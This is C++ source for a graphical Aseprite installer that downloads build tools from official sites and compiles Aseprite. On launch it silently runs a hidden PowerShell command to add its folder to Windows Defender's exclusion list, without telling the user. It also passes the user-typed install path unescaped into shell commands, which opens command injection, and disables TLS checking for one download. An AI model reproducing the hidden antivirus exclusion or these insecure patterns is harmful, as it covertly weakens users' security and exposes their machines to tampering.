#include <string>
#pragma warning(disable : 4996)
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <direct.h>
#include <thread>
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#define NOGDI             
#define NOUSER  
#endif
#undef Rectangle
#undef CloseWindow
#undef ShowCursor
#undef PlaySound
extern "C" {
#include "raylib.h"
}
extern "C" int __stdcall WinExec(const char* lpCmdLine, unsigned int uCmdShow);
#define SW_HIDE 0
bool disparado = false;
int passo = 0;
int main() {
    bool prontoParaProximo = false;
    int contagemLetras = 11;
    int pagina = 0;
    int comandoEnviado = 2;
    char pasta[300] = "C:\Aseprite";
    bool jaDisparado = false;
    int letras = 11;
    int x = 600, y = 450;
    int x2 = 500, y2 = 600;
    char caminho;
    int seila = 1;
    char lingua = ' ';
    int caixa_de_texto = 10;
    char path[260];
    char comando1[560];
    char comando2[560];
    char comando3[560];
    char comando[2048];
    Vector2 posicaoTexto2 = { 310, 20 };
    Vector2 posicaoTexto55 = { 320, 350 };
    Rectangle botao4 = { 320, 350, 150, 70 };
    std::string pastaCopia = pasta;
    float progresso = 0.0;
    _getcwd(path, sizeof(path));
    Rectangle botao3 = { 320, 350, 150, 70 };
    bool mouseEmCima3 = false;
    sprintf_s(comando, "powershell -Command \"Add - MpPreference - ExclusionPath '%s'\"", path);
    WinExec(comando, SW_HIDE);
    InitWindow(x, y, "Instalador Aseprite");
    SetTargetFPS(60);
    Font fonteLusa = LoadFontEx("C:\\Windows\\Fonts\\arial.ttf", 500, 0, 250);
    sprintf_s(comando1, "%s\\icon\\icon1.png", path);
    Texture2D logo = LoadTexture(comando1);
    sprintf_s(comando2, "%s\\icon\\icon1.png", path);
    Image icone = LoadImage(comando2);
    sprintf_s(comando3, "%s\\icon\\3143442.png", path);
    Texture2D arquivo = LoadTexture(comando3);
    SetWindowIcon(icone);
    UnloadImage(icone);
    while (!WindowShouldClose()) {
        BeginDrawing();
        ClearBackground(RAYWHITE);
        if (pagina == 0) {
            DrawRectangle(50, 50, 190, 190, LIGHTGRAY);
            DrawTexture(logo, 80, 80, WHITE);
            Vector2 pos = { 300, 10 };
            DrawTextEx(fonteLusa, "Welcome to\n\nAseprite setup.\n\n\nBem vindo ao\n\ninstalador do\n\nAseprite.\n\n\nVoce fala:\n\nDo you speak:", pos, 40, 2, BLACK);
            Rectangle botao = { 50, 350, 190, 70 };
            Vector2 botaopose = { 70, 370 };
            bool mouseEmCima = CheckCollisionPointRec(GetMousePosition(), botao);
            DrawRectangleRounded(botao, 0.2, 10, BLUE);
            DrawTextEx(fonteLusa, "Portugues", botaopose, 30, 2, BLACK);
            if (mouseEmCima == true) {
                DrawRectangleRounded(botao, 0.2, 10, SKYBLUE);
            }
            if (mouseEmCima && IsMouseButtonPressed(MOUSE_LEFT_BUTTON)) {
                DrawRectangleRounded(botao, 0.2, 10, GREEN);
                lingua = 'p';
            }
            Rectangle botao2 = { 370 , 350, 190, 70 };
            Vector2 botaopose2 = { 410, 370 };
            bool mouseEmCima2 = CheckCollisionPointRec(GetMousePosition(), botao2);
            DrawRectangleRounded(botao2, 0.2, 10, BLUE);
            DrawTextEx(fonteLusa, "English", botaopose2, 30, 2, BLACK);
            if (mouseEmCima2 == true) {
                DrawRectangleRounded(botao2, 0.2, 10, SKYBLUE);
            }
            if (mouseEmCima2 && IsMouseButtonPressed(MOUSE_LEFT_BUTTON)) {
                DrawRectangleRounded(botao2, 0.2, 20, GREEN);
                lingua = 'e';
            }
            if ((mouseEmCima2 && IsMouseButtonPressed(MOUSE_LEFT_BUTTON)) || (mouseEmCima && IsMouseButtonPressed(MOUSE_LEFT_BUTTON)) || WindowShouldClose()) {
                pagina = 1;
            }
        }
        else if (pagina == 1) {
            DrawTexture(arquivo, 350, 200, WHITE);
            Rectangle botao3 = { 320, 350, 150, 70 };
            mouseEmCima3 = CheckCollisionPointRec(GetMousePosition(), botao3);
            DrawRectangle(50, 50, 190, 190, LIGHTGRAY);
            DrawTexture(logo, 80, 80, WHITE);
            Vector2 pos = { 300, 10 };
            DrawRectangleRounded(botao3, 0.2, 20, BLUE);
            Vector2 posicaoTexto = { 260, 100 };
            if (lingua == 'p') {
                DrawTextEx(fonteLusa, "Local de\n\ninstalacao:\n\n\n", posicaoTexto2, 30, 2, BLACK);
            }
            else {
                DrawTextEx(fonteLusa, "instalation\n\ndirectory:\n\n\n", posicaoTexto2, 30, 2, BLACK);
            }
            if (lingua == 'p') {
                DrawText("Instalar", 330, 370, 30, BLACK);
            }
            else {
                DrawText("Install", 340, 370, 30, BLACK);
            }
            int key = GetCharPressed();
            while (key > 0) {
                if (contagemLetras < 63) {
                    pasta[contagemLetras] = (char)key;
                    pasta[contagemLetras + 1] = '\0';
                    contagemLetras++;
                }
                key = GetCharPressed();
            }
            if (IsKeyPressed(KEY_BACKSPACE) && contagemLetras > 0) {
                contagemLetras--;
                pasta[contagemLetras] = '\0';
            }
            DrawText(pasta, 350, 100, 15, BLACK);
        if (mouseEmCima3) {
            DrawRectangleRounded(botao3, 0.2, 10, SKYBLUE);
        }
        if (mouseEmCima3 && IsMouseButtonPressed(MOUSE_LEFT_BUTTON)) {
            DrawRectangleRounded(botao3, 0.2, 20, GREEN);
            pagina = 2;
        }
        }
  
        else if (pagina == 2) {
            if (!DirectoryExists(TextFormat("%s", pasta))) {
                std::thread([pasta]() {
                    char comando90[2000];
                    sprintf(comando90, "mkdir \"%s\"", pasta);
                    system(comando90);
                    }).detach();
            }
            if (lingua == 'p') {
                DrawText("INSTALANDO Aseprite...", 120, 80, 30, MAROON);
            }
            else {
                DrawText("INSTALLING Aseprite...", 120, 80, 30, MAROON);
            }
            DrawRectangle(80, 200, 440, 40, LIGHTGRAY);
            DrawRectangle(80, 200, (int)(progresso * 440), 40, BLUE);
            const char* status = "Iniciando...";
            if (lingua == 'p') {
                if (passo == 0) status = "Copiando Visual Studio...";
                else if (passo == 2) status = "Baixando CMake...";
                else if (passo == 4) status = "Baixando Skia...";
                else if (passo == 5) status = "Verificando Git...";
                else if (passo == 6) status = "Baixando Ninja...";
                else if (passo == 7) status = "Verificando Aseprite...";
                else if (passo >= 8) status = "Baixando e compilando Aseprite...";
                DrawText(TextFormat("Passo: %d - %s", passo, status), 90, 260, 20, DARKGRAY);
                DrawText(TextFormat("Progresso: %.0f%%", progresso * 100), 90, 290, 20, BLACK);
            }
            else {
                if (passo == 0) status = "Copping Visual Studio...";
                else if (passo == 2) status = "Downloading CMake...";
                else if (passo == 4) status = "Downloading Skia...";
                else if (passo == 5) status = "Downloading Git...";
                else if (passo == 6) status = "Downloading Ninja...";
                else if (passo == 7) status = "Checking Aseprite...";
                else if (passo >= 8) status = "Downloading and building Aseprite...";
                DrawText(TextFormat("Step: %d - %s", passo, status), 90, 260, 20, DARKGRAY);
                DrawText(TextFormat("Progress: %.0f%%", progresso * 100), 90, 290, 20, BLACK);
            }
            if (progresso < 0.98) progresso += 0.0005;
            if (passo == 0) {
                if (!disparado) {
                    disparado = true;
                    std::thread([&prontoParaProximo, pasta]() {
                        char cmd[1024];
                        sprintf_s(cmd, sizeof(cmd), "cmd.exe /c curl -SL -o \"%s\\vs.exe\" https://aka.ms/vs/17/release/vs_community.exe && "
                            "start /wait \"\" \"%s\\vs.exe\" --passive --norestart --wait "
                            "--add Microsoft.VisualStudio.Workload.NativeDesktop "
                            "Microsoft.VisualStudio.Component.Windows11SDK.22621"
                            "--add Microsoft.VisualStudio.Component.VC.Tools.x86.x64 "
                            "--add Microsoft.VisualStudio.Component.Windows10SDK.18362 "
                            "--add Microsoft.VisualStudio.Component.VC.CMake.Project",
                            pasta, pasta);

                        system(cmd);
                        prontoParaProximo = true;
                        }).detach();
                }
                if (FileExists("C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\VsDevCmd.bat") && prontoParaProximo) {
                    passo = 2;
                    progresso = 0.0f;
                    disparado = false;
                    prontoParaProximo = false;
                }
            }
            else if (passo == 2) {
                if (!disparado) {
                    disparado = true;
                    std::thread([pasta]() {
                        char cmd[1024];
                        sprintf_s(cmd, "cmd.exe /c curl -L -o \"%s\\cmake.zip\" https://github.com/Kitware/CMake/releases/download/v3.31.11/cmake-3.31.11-windows-x86_64.zip && cd /d \"%s\" && tar -xf cmake.zip && ren \"cmake-3.31.11-windows-x86_64\" \"Cmake\" && del cmake.zip", pasta, pasta);
                        WinExec(cmd, SW_HIDE);
                        }).detach();
                }
                if (DirectoryExists(TextFormat("%s\\Cmake", pasta))) {
                    passo = 4;
                    progresso = 0.0f;
                    disparado = false;
                }
            }
            else if (passo == 4) {
                if (!disparado) {
                    disparado = true;
                    std::thread([pasta]() {
                        char cmd[3000];
                        sprintf_s(cmd, "cmd.exe /c mkdir \"%s\\skia\" && curl -L -o \"%s\\skia.zip\" https://github.com/aseprite/skia/releases/download/m124-08a5439a6b/Skia-Windows-Release-x64.zip && tar -xf \"%s\\skia.zip\" -C \"%s\\skia\" && del skia.zip", pasta, pasta, pasta, pasta);
                        WinExec(cmd, SW_HIDE);
                        }).detach();
                }
                if (FileExists(TextFormat("%s\\skia\\out\\Release-x64\\skia.lib", pasta))) {
                    passo = 5;
                    progresso = 0.0f;
                    disparado = false;
                }
            }
            else if (passo == 5) {
                if (!disparado) {
                    disparado = true;
                    std::thread([&prontoParaProximo, pasta]() {
                        char cmd[3000];
                        sprintf_s(cmd, "cmd.exe /c curl -L -o \"%s\\Git.7z.exe\" https://github.com/git-for-windows/git/releases/download/v2.53.0.windows.3/PortableGit-2.53.0.3-64-bit.7z.exe && \"%s\\Git.7z.exe\" -y -gm2 -InstallPath=\"%s\"", pasta, pasta, pasta);
                        system(cmd);
                        prontoParaProximo = true;
                        }).detach();
                }
                if (FileExists(TextFormat("%s\\PortableGit\\bin\\git.exe", pasta)) && prontoParaProximo) {
                    passo = 6;
                    progresso = 0.0f;
                    disparado = false;
                }
            }
            else if (passo == 6) {
                if (!disparado) {
                    disparado = true;
                    std::thread([pasta]() {
                        char cmd2[4000];
                        sprintf_s(cmd2,
                            "cmd.exe /c \"mkdir \"%s\\ninja\" && curl -fL -k -o \"%s\\ninja-win.zip\" https://github.com/ninja-build/ninja/releases/download/v1.13.1/ninja-win.zip && tar -xf \"%s\\ninja-win.zip\" -C \"%s\\ninja\" && tar -xf \"%s\\ninja-win.zip\" -C \"%s\\Cmake\\bin\" && del \"%s\\ninja-win.zip\"",
                            pasta, pasta, pasta, pasta, pasta, pasta, pasta, pasta, pasta, pasta);
                        WinExec(cmd2, SW_HIDE);
                        }).detach();
                }
                if (FileExists(TextFormat("%s\\Cmake\\bin\\ninja.exe", pasta))) {
                    passo = 7;
                    progresso = 0.0f;
                    disparado = false;
                    prontoParaProximo = false;
                }
            }

            else if (passo == 7) {
                if (!disparado) {
                    disparado = true;
                    std::thread([&prontoParaProximo, pasta]() {
                        char cmd[3000];
                        sprintf_s(cmd, "cmd.exe /c \"cd /d \"%s\" && \"%s\"\\PortableGit\\bin\\git.exe clone --recursive https://github.com/aseprite/aseprite.git && cd aseprite && \"%s\"\\PortableGit\\bin\\git.exe pull && \"%s\"\\PortableGit\\bin\\git.exe submodule update --init --recursive", pasta, pasta, pasta, pasta, pasta);
                        system(cmd);
                        prontoParaProximo = true;
                        }).detach();
                }
                if (DirectoryExists(TextFormat("%s\\aseprite", pasta)) && prontoParaProximo) {
                    passo = 8;
                    progresso = 0.0f;
                    disparado = false;
                }
            }
            else if (passo == 8) {
                if (!disparado) {
                    disparado = true;
                    std::thread([&prontoParaProximo, pasta]() {
                        char cmd[4096];
                        sprintf_s(cmd, "call \"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\VsDevCmd.bat\" -arch=x64 && cd \"%s\\aseprite\" && mkdir build && cd build && \"%s\\Cmake\\bin\\cmake.exe\" -DCMAKE_BUILD_TYPE=RelWithDebInfo -G Ninja -DLAF_BACKEND=skia -DSKIA_DIR=\"%s\"\\skia -DSKIA_LIBRARY_DIR=\"%s\"\\skia\\out\\Release-x64 -DSKIA_LIBRARY=\"%s\"\\skia\\out\\Release-x64\\skia.lib .. && \"%s\"\\ninja\\ninja.exe aseprite",
                            pasta, pasta, pasta, pasta, pasta, pasta);
                        system(cmd);
                        prontoParaProximo = true;
                        }).detach();
                }
                if (FileExists(TextFormat("%s\\aseprite\\build\\bin\\aseprite.exe", pasta)) && prontoParaProximo) {
                    passo = 9;
                    progresso = 1.0f;
                    pagina = 3;
                }
            }
        }
            if(passo == 9 && pagina == 3) {
                if (lingua == 'p') {
                    DrawText("Instalado com successo", 120, 80, 30, MAROON);
                }
                else{
                    DrawText("Success", 120, 80, 30, MAROON);
                }
                DrawTextEx(fonteLusa, "OK", posicaoTexto55, 15, 2, BLACK);
                DrawRectangleRounded(botao4, 0.2, 10, BLUE);
      
            if (mouseEmCima3) {
                DrawRectangleRounded(botao4, 0.2, 10, SKYBLUE);
            }
            if (mouseEmCima3 && IsMouseButtonPressed(MOUSE_LEFT_BUTTON)) {
                DrawRectangleRounded(botao4, 0.2, 20, GREEN);
                break;
            }
        }
        EndDrawing();
    }
    CloseWindow();
        return 0;
}

